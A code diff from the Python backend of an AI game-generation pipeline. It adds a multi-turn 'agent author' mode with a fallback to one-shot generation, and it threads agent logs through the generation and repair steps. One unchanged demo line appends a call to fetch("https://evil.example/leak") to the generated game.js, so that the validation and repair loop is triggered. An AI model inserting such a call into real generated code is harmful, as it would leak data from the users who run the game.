@@ -550,9 +550,10 @@ def _file_log_lines(files: list[dict]) -> list[str]:
         return ["generated files: none"]
     total = sum(len((file.get("content") or "").encode("utf-8")) for file in files)
     names = ", ".join(file.get("path", "?") for file in files)
-    lines = [f"generated files: {names}", f"bundle size: {total} bytes"]
-    for file in files:
-        lines.append(f"{file.get('path', '?')}: {len((file.get('content') or '').encode('utf-8'))} bytes")
+    lines = [f"{file.get('path', '?')}: {len((file.get('content') or '').encode('utf-8'))} bytes" for file in files]
+    lines.append(f"bundle size: {total} bytes")
+    # 摘要行放最后：task_out 取步骤末行当 step summary，前端进度页直接显示文件结构
+    lines.append(f"generated files: {names} ({len(files)} file(s))")
     return lines
 
 
@@ -1312,27 +1313,49 @@ def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[d
         # 官方 skills 蒸馏的 API 备忘单）；模板兜底与失败回退仍是 Canvas。
         use_phaser = bool(settings.PHASER_2D_ENABLED)
         runtime = "phaser" if use_phaser else "canvas"
-        try:
-            result = llm.chat(
-                prompts.CODE_SYSTEM_PROMPT_PHASER if use_phaser else prompts.CODE_SYSTEM_PROMPT,
-                prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, runtime=runtime),
-                timeout=settings.OPENAI_CODE_TIMEOUT,
-                allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
-            )
-            raw, tokens = result
-            bundle = _extract_bundle(raw)
-            js = bundle.get("game.js", "")
-            if js and len(js) > 400:
-                files = _assemble_bundle(bundle, cfg.get("title") or "GameWeave Game", runtime=runtime)
-                shape = "full bundle" if bundle.get("index.html") else "game.js"
-                partial = "partial " if getattr(result, "partial", False) else ""
-                mode = f"model ({partial}phaser {shape})" if use_phaser else f"model ({partial}{shape})"
+        authored = False
+        if repair_error is None and code_agent.author_enabled(state):
+            # 作者模式：从骨架起步，agent 自定文件结构逐文件成稿（每轮一个小 patch，
+            # 绕开单请求超时墙）。不可用/产出过短落回下方单次整包生成；产物照常过
+            # build_validation / gameplay QA 门禁。
+            skeleton = _assemble_bundle({}, cfg.get("title") or "GameWeave Game", runtime=runtime)
+            outcome = code_agent.run_author(skeleton, spec=spec, design=design, runtime=runtime)
+            author_js = ""
+            if outcome:
+                author_js = next((f["content"] for f in outcome.files if f["path"] == "game.js"), "")
+                agent_logs = list(outcome.logs)
+            if outcome and len(author_js) > 400:
+                files = outcome.files
+                tokens = outcome.tokens
+                mode = (
+                    f"agent author ({len(files)} file(s), {outcome.turns} turn(s), "
+                    f"checks {'ok' if outcome.checks_ok else 'pending'})"
+                )
+                authored = True
             else:
-                _real_model_fallback_or_raise("GameCodeAgent", "model output too short")
-                mode = "template (model output too short)"
-        except Exception as exc:  # noqa: BLE001
-            _real_model_fallback_or_raise("GameCodeAgent", exc, exc)
-            mode = f"template (model failed: {_clip(exc, 120)})"
+                agent_logs.append("author agent unavailable or output too short; falling back to one-shot generation")
+        if not authored:
+            try:
+                result = llm.chat(
+                    prompts.CODE_SYSTEM_PROMPT_PHASER if use_phaser else prompts.CODE_SYSTEM_PROMPT,
+                    prompts.build_code_prompt(spec, design, _reference_for(spec), repair_error, runtime=runtime),
+                    timeout=settings.OPENAI_CODE_TIMEOUT,
+                    allow_partial=settings.OPENAI_ALLOW_PARTIAL_CODE_STREAM,
+                )
+                raw, tokens = result
+                bundle = _extract_bundle(raw)
+                js = bundle.get("game.js", "")
+                if js and len(js) > 400:
+                    files = _assemble_bundle(bundle, cfg.get("title") or "GameWeave Game", runtime=runtime)
+                    shape = "full bundle" if bundle.get("index.html") else "game.js"
+                    partial = "partial " if getattr(result, "partial", False) else ""
+                    mode = f"model ({partial}phaser {shape})" if use_phaser else f"model ({partial}{shape})"
+                else:
+                    _real_model_fallback_or_raise("GameCodeAgent", "model output too short")
+                    mode = "template (model output too short)"
+            except Exception as exc:  # noqa: BLE001
+                _real_model_fallback_or_raise("GameCodeAgent", exc, exc)
+                mode = f"template (model failed: {_clip(exc, 120)})"
     elif state.get("use_real") and state.get("use_template_code"):
         _real_model_fallback_or_raise("GameCodeAgent", "template-code fallback requested")
 
@@ -1340,14 +1363,16 @@ def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[d
         for file in files:
             if file["path"] == "game.js":
                 file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
-    return files, tokens, mode
+    return files, tokens, mode, agent_logs
 
 
 def _revision_file_map(files: list[dict] | None) -> dict[str, str]:
+    # 全量文件按原顺序进 map：修订提示词的 html/css/js 标签只寻址三件套，
+    # 作者模式产出的额外模块（shop.js 等）原样保留、字节不动。
     return {
         str(file.get("path")): str(file.get("content") or "")
         for file in (files or [])
-        if file.get("path") in {"index.html", "style.css", "game.js"}
+        if file.get("path")
     }
 
 
@@ -1369,7 +1394,7 @@ def _generate_revision_code(
             changed = ["game.js"]
         else:
             changed = []
-        files = [{"path": path, "content": merged[path]} for path in ("index.html", "style.css", "game.js") if path in merged]
+        files = [{"path": path, "content": content} for path, content in merged.items()]
         return files, 0, changed, f"offline deterministic {state.get('task_kind', 'revision')}"
 
     result = llm.chat(
@@ -1396,7 +1421,7 @@ def _generate_revision_code(
             continue
         merged[path] = content
         changed.append(path)
-    files = [{"path": path, "content": merged[path]} for path in ("index.html", "style.css", "game.js") if path in merged]
+    files = [{"path": path, "content": content} for path, content in merged.items()]
     partial = "partial " if getattr(result, "partial", False) else ""
     return files, tokens, changed, f"model {partial}incremental revision"
 
@@ -1822,7 +1847,7 @@ def code_revision_node(state: dict) -> dict:
 
 
 def code_generation_node(state: dict) -> dict:
-    files, tokens, mode = _generate_code(state)
+    files, tokens, mode, agent_logs = _generate_code(state)
     spec = state.get("game_spec") or {}
     design = state.get("game_design") or {}
     if state.get("dimension") == "3d":
@@ -1845,6 +1870,8 @@ def code_generation_node(state: dict) -> dict:
             f"control hint: {_clip(cfg.get('hint'), 90)}",
             f"game.js source: {mode}",
         ] + _file_log_lines(files)
+    if agent_logs:
+        logs += agent_logs
     if _should_inject(state):
         logs.append("[demo] injected forbidden API to trigger repair loop")
     return {"generated_files": files, "_agent": "GameCodeAgent", "_tokens_delta": tokens, "_logs": logs}
@@ -1927,7 +1954,7 @@ def repair_code_node(state: dict) -> dict:
             )
         else:
             logs.append("agent loop unavailable; falling back to full regeneration")
-    files, tokens, mode = _generate_code({**state, "repair_attempts": attempts}, repair_error=state.get("last_error"))
+    files, tokens, mode, regen_agent_logs = _generate_code({**state, "repair_attempts": attempts}, repair_error=state.get("last_error"))
     return {
         "generated_files": files,
         "repair_attempts": attempts,
@@ -1935,6 +1962,7 @@ def repair_code_node(state: dict) -> dict:
         "_tokens_delta": tokens + agent_tokens,
         "_logs": logs
         + [f"regenerated game.js using {mode}"]
+        + regen_agent_logs
         + _file_log_lines(files)
         + ["queued validation retry"],
     }
